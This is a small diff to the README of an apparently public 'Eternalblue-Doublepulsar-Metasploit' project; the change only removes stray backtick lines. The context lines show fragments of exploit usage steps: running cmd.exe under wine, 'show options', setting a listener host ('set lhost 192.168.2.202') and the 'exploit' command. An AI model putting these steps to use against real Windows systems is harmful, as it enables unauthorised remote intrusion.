@@ -1,6 +1,5 @@
 # Eternalblue-Doublepulsar-Metasploit
 <pre>
-`
 wine cmd.exe
 exit
 
@@ -27,7 +26,6 @@ show options
 set lhost 192.168.2.202
 
 exploit
-`
 </pre>
 
 
